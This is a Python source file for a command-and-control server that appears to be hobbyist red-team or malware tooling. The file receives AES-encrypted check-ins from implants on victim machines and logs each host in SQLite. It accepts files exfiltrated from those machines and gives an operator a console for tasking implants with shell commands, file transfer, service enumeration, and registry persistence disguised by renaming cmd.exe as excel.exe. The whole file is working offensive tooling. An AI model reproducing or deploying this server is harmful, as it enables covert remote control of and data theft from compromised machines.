import socket
from time import sleep
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import http.server
import logging
import time
import os
import ssl
import base64 
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad
import cgi
import sqlite3 as db
from datetime import datetime
import requests
import re
import shutil


#global variables 

key = 'AAAAAAAAAAAAAAAA' #16 char for AES128. change on server and client-side to match
iv =  'BBBBBBBBBBBBBBBB'.encode('utf-8') #16 char for AES128. change on server and client-side to match
path_to_cert_pem = '/etc/letsencrypt/live/your.domain.com/cert.pem'
path_to_priv_pem = '/etc/letsencrypt/live/your.domain.com/privkey.pem'
unique_file_name = '/submit.php?id=8675309'

#colors
green = "\033[32m"
cyan = "\033[36m"
reset = "\033[39m"


print(green + r""" 

                                                                        
                                                        
          ____                                          
        ,'  , `.    ,---,          ,----..       ,---,. 
     ,-+-,.' _ |   '  .' \        /   /   \    ,'  .' | 
  ,-+-. ;   , ||  /  ;    '.     |   :     : ,---.'   | 
 ,--.'|'   |  ;| :  :       \    .   |  ;. / |   |   .' 
|   |  ,', |  ': :  |   /\   \   .   ; /--`  :   :  |-, 
|   | /  | |  || |  :  ' ;.   :  ;   | ;     :   |  ;/| 
'   | :  | :  |, |  |  ;/  \   \ |   : |     |   :   .' 
;   . |  ; |--'  '  :  | \  \ ,' .   | '___  |   |  |-, 
|   : |  | ,     |  |  '  '--'   '   ; : .'| '   :  ;/| 
|   : '  |/      |  :  :         '   | '/  : |   |    \ 
;   | |`-'       |  | ,'         |   :    /  |   :   .' 
|   ;/           `--''            \   \ .'   |   | ,'   
'---'                              `---`     `----'       
                                                                        

    "Most Average C2 Ever"

""" + reset)

try:
    os.mkdir("/opt/c2/web/")
    os.mkdir("/opt/c2/downloads/")
except FileExistsError:
    pass

conn = db.connect('implant.db')
cursor = conn.cursor()
table ="""CREATE TABLE IF NOT EXISTS IMPLANT_TABLE
                                        (HOSTNAME VARCHAR(255), 
                                        USERNAME VARCHAR(255),
                                        DOMAIN VARCHAR(255),
                                        IP VARCHAR(255), 
                                        CHECKIN_TIME VARCHAR(255), 
                                        UNIQUE_ID int);"""
cursor.execute(table)
conn.commit()
conn.close()


def process():
    class S(BaseHTTPRequestHandler):
        def _set_headers(self):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()


        def do_GET(self):
                #print(self.path)
                #self.send_header('Content-type', 'text/html')
                path = '/opt/c2/web' + self.path

                with open(path, 'rb') as f:
                    data = f.read()
                self.send_response(200)
                self.end_headers()
                self.wfile.write(data)


        def log_message(self, format, *args):
                return


        def do_POST(self):
            if self.path == '/results':
                do_results(self)
            if self.path == '/checkin':
                do_checkin(self)
            elif self.path == '/api':
                do_fileupload(self)

    def do_results(self):
        content_len = int(self.headers.get('Content-Length', 0))
        post_body = self.rfile.read(content_len)

        bytes = post_body
        string = bytes.decode("utf-8", "ignore")
        #print(string)

        data_to_decrypt = requests.utils.unquote(string)
        #print('\n Incoming encrypted results: ',(data_to_decrypt))

        decrypted = decrypt(data_to_decrypt,key,iv)
        #print("results" + decrypted.decode("utf-8", "ignore"), "\n\n")

        x = decrypted.decode("utf-8", "ignore")

        guidp1 = re.search(r"\[([A-Za-z0-9_]+)\]", x)
        guid = guidp1.group(1)

        #print(guid)
        print(green + "\n\n[*] " + reset + "Incoming results from " + cyan + "[" + guid + "]:" + "\n\n" + x + reset)
        
        file = open("/opt/c2/web/" + guid + unique_file_name, "w+")
        file.write("null")
        file.close()
        
        
        #self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))


    def do_checkin(self):

        content_len = int(self.headers.get('Content-Length', 0))
        #print("Hello from Check-in")
        post_body = self.rfile.read(content_len)

        bytes = post_body
        string = bytes.decode("utf-8", "ignore")
        data_to_decrypt = requests.utils.unquote(string)
        decrypted = decrypt(data_to_decrypt,key,iv)
        #print("\n\n", decrypted.decode("utf-8", "ignore"), "\n\n")
        x = decrypted.decode("utf-8", "ignore")
        #print(x)

        hostname = x.split(',')[0]
        #print("hostname :" + hostname)

        uID = x.split(',')[1]
        #print("uID :" + uID)

        ip = x.split(',')[2]
        #print("ip :" + ip)

        domain = x.split(',')[3]
        #print("domain :" + domain)

        username = x.split(',')[4]
        #print("username :" + username)
        
        now = datetime.now()
        #print("current time:" + now)
        

        conn = db.connect('implant.db')
        cursor = conn.cursor()
        table ="""CREATE TABLE IF NOT EXISTS IMPLANT_TABLE
                                        (HOSTNAME VARCHAR(255),                   
                                        USERNAME VARCHAR(255),
                                        DOMAIN VARCHAR(255),
                                        IP VARCHAR(255), 
                                        CHECKIN_TIME VARCHAR(255), 
                                        UNIQUE_ID int);"""
        cursor.execute(table)
        cursor.execute("insert into IMPLANT_TABLE (HOSTNAME, USERNAME, DOMAIN, IP, CHECKIN_TIME, UNIQUE_ID) values (?, ?, ?, ?, ?, ?)",
            (hostname, username, domain, ip, now, uID)) 
        conn.commit()
          

        ##Display column headers
        #print('\nColumns in IMPLANT_TABLE table:')
        #data=cursor.execute('''SELECT * FROM IMPLANT_TABLE''')
        #for column in data.description:
        #    print(column[0])
              
        ##Display all data
        #print('\nData in IMPLANT_TABLE table:')
        #data=cursor.execute('''SELECT * FROM IMPLANT_TABLE''')
        #for row in data:
        #    print(row)

        last_row = cursor.execute('select * from IMPLANT_TABLE').fetchall()[-1]
        print(green + "\n[*] " + reset +"New implant check in: ", last_row)

        conn.close()

        try:
            os.mkdir("/opt/c2/web/" + uID)

        except:
            pass 

        try:
            file = open("/opt/c2/web/" + uID + unique_file_name, "w+")
            file.write("null")
            file.close()

        except:
            pass

        try:
            basePath = "/opt/c2/web/" + uID + "/"
            dirToCreate = "receiver"
            fullPath = os.path.join(basePath, dirToCreate)
        
            try:
                os.makedirs(fullPath)

            except:
                pass
        except:
            pass  

        #self.wfile.write(GUID.format(self.path).encode('utf-8'))


    def do_fileupload(self):
            form = cgi.FieldStorage(
                fp=self.rfile,
                headers=self.headers,
                environ={'REQUEST_METHOD':'POST',
                         'CONTENT_TYPE':self.headers['Content-Type'],
                         })
            filename = form['file'].filename
            data = form['file'].file.read()
            #open("/tmp/%s"%filename, "wb").write(data)

            decoded_string = base64.b64decode(data)

            
            try:
                file2write = open("/opt/c2/downloads/%s"%filename, "wb")
                file2write.write(decoded_string);
                print(green + "\n[*] " + reset + filename + ' successfully saved to /opt/c2/downloads\r')
                file2write.close()


                
            except:
                pass

    def decrypt(enc,key,iv):
            enc = base64.b64decode(enc)
            cipher = AES.new(key.encode('utf-8'), AES.MODE_CBC, iv)
            return unpad(cipher.decrypt(enc),16)

    


    def run(server_class=HTTPServer, handler_class=S, port=443):
        logging.basicConfig(level=logging.INFO)
        server_address = ('', port)
        httpd = server_class(server_address, handler_class)
       
        sslctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        sslctx.check_hostname = False
        sslctx.load_cert_chain(certfile=path_to_cert_pem, keyfile=path_to_priv_pem)
        httpd.socket = sslctx.wrap_socket(httpd.socket, server_side=True)

        #logging.info('')
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            pass
        httpd.server_close()
        logging.info('Stopping httpd...\n')

    if __name__ == '__main__':
        from sys import argv

        if len(argv) == 2:
            run(port=int(argv[1]))
        else:

            run()


thread = threading.Thread(target=process)
thread.daemon = True
thread.start()
while True:

    now = datetime.now()
     
    command = input(str(now)[:19] + " >> ") # date + UTC time
    #command = input(str(now)[:10] + " >>") # date only

    if "help" in command:
        print("\nList of commands:\n")
        print(green + "sessions " + reset + "(displays sessions in database)")
        print(green + "use <session number here> " + reset + "(set a session as active)")
        print(green + "back " + reset + "(leave a sesssion and go back)")
        print(green + "dir " + reset + "(displays a simple directory listing. Example: dir c:\\temp)")
        print(green + "copy " + reset + "(copys a local file on target from one location to another. Example: copy c:\\test.txt c:\\windows\\test.txt)")
        print(green + "upload " + reset + "(upload a file from c2 server to target. Example: upload /tmp/file.exe c:\\temp\\file.exe)")
        print(green + "download " + reset + "(downloads a file from target back to c2 server. Example: download c:\\temp\\file.exe")
        print(green + "runningTasks " + reset + "(displays all running tasks on target. Example: runningTasks)")
        print(green + "runningServices " + reset + "(displays all running services on target. Example: runningServices)")
        print(green + "serviceInfo " + reset + "(displays information about a specific service on target. Example: serviceInfo ServiceNameHere)")
        print(green + "persist " + reset + "(copies c:\\windows\\system32\\cmd.exe to AppData, renames to excel.exe, and modifies registry to run implant at next logon. Example: persist)")
        print(green + "shell " + reset + "(copies powershell.exe to AppData, renames to winword.exe. Example: shell ipconfig)")


    else: 
        print()

    if "sessions" in command:

        # Display all data
        
        conn = db.connect('implant.db')
        cursor = conn.cursor()
        print(green + "[*] " + reset + 'Data in IMPLANT_TABLE table:\n')
        data=cursor.execute('''SELECT * FROM IMPLANT_TABLE''')
        for row in data:
            print(row)
        conn.close()
        print()

    else: 
        print()

    if "use" in command:
        ActiveImplant = command.rsplit(' ')[1]
        print(green + "[*] " + reset + "Active Implant is now: " + "[" + cyan + ActiveImplant + reset + "]\n")

        while True:
            command = input(str(now)[:19] + " [" + cyan + ActiveImplant + reset + "] " + " >> ") # date + UTC time

            
            if "dir" in command:
                TaskToRun = command
                print(green + "\n[*] " + reset + "Tasking "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")                
                EncryptedTaskToRun = encrypt(TaskToRun,key,iv).decode("utf-8", "ignore")
                file = open("/opt/c2/web/" + ActiveImplant + unique_file_name, "w+")
                file.write(EncryptedTaskToRun)
                file.close()

            else: 
                pass

            if "runningTasks" in command:
                TaskToRun = command
                print(green + "\n[*] " + reset + "Tasking "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")                
                EncryptedTaskToRun = encrypt(TaskToRun,key,iv).decode("utf-8", "ignore")
                file = open("/opt/c2/web/" + ActiveImplant + unique_file_name, "w+")
                file.write(EncryptedTaskToRun)
                file.close()

            else: 
                pass

            if "runningServices" in command:
                TaskToRun = command
                print(green + "\n[*] " + reset + "Tasking "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")                
                EncryptedTaskToRun = encrypt(TaskToRun,key,iv).decode("utf-8", "ignore")
                file = open("/opt/c2/web/" + ActiveImplant + unique_file_name, "w+")
                file.write(EncryptedTaskToRun)
                file.close()

            else: 
                pass

            if "serviceInfo" in command:
                TaskToRun = command
                print(green + "\n[*] " + reset + "Tasking "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")                
                EncryptedTaskToRun = encrypt(TaskToRun,key,iv).decode("utf-8", "ignore")
                file = open("/opt/c2/web/" + ActiveImplant + unique_file_name, "w+")
                file.write(EncryptedTaskToRun)
                file.close()

            else: 
                pass

            if "download" in command:
                TaskToRun = command
                print(green + "\n[*] " + reset + "Tasking "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")                
                EncryptedTaskToRun = encrypt(TaskToRun,key,iv).decode("utf-8", "ignore")
                file = open("/opt/c2/web/" + ActiveImplant + unique_file_name, "w+")
                file.write(EncryptedTaskToRun)
                file.close()

            else: 
                pass

            if "persist" in command:
                TaskToRun = command
                print(green + "\n[*] " + reset + "Tasking "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")                
                EncryptedTaskToRun = encrypt(TaskToRun,key,iv).decode("utf-8", "ignore")
                file = open("/opt/c2/web/" + ActiveImplant + unique_file_name, "w+")
                file.write(EncryptedTaskToRun)
                file.close()

            else: 
                pass

            if "copy" in command:
                TaskToRun = command
                print(green + "\n[*] " + reset + "Tasking "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")                
                EncryptedTaskToRun = encrypt(TaskToRun,key,iv).decode("utf-8", "ignore")
                file = open("/opt/c2/web/" + ActiveImplant + unique_file_name, "w+")
                file.write(EncryptedTaskToRun)
                file.close()

            else: 
                pass

            if "upload" in command:
                TaskToRun = command
                print(green + "\n[*] " + reset + "Tasking "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")                
                
                x, SourceFile, destination = TaskToRun.split(' ', 2)
                   
                shutil.copy(SourceFile, "/opt/c2/web/" + ActiveImplant + "/receiver/")
                print(green + "\n[*] " + reset + "Local file " + SourceFile + " successfully staged for download in:  "+ "/opt/c2/web/" + ActiveImplant + "/receiver/" + "\n")  

                EncryptedTaskToRun = encrypt(TaskToRun,key,iv).decode("utf-8", "ignore")
                file = open("/opt/c2/web/" + ActiveImplant + unique_file_name, "w+")
                file.write(EncryptedTaskToRun)
                file.close()

            else: 
                pass

            if "shell" in command:
                TaskToRun = command
                print(green + "\n[*] " + reset + "Tasking "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")                
                EncryptedTaskToRun = encrypt(TaskToRun,key,iv).decode("utf-8", "ignore")
                file = open("/opt/c2/web/" + ActiveImplant + unique_file_name, "w+")
                file.write(EncryptedTaskToRun)
                file.close()

            else: 
                pass

            if "back" in command:
                break

    if "exit" in command:
                exit()   
    else: 
        pass

    def encrypt(data,key,iv):
        data= pad(data.encode(),16)
        cipher = AES.new(key.encode('utf-8'),AES.MODE_CBC,iv)
        return base64.b64encode(cipher.encrypt(data))
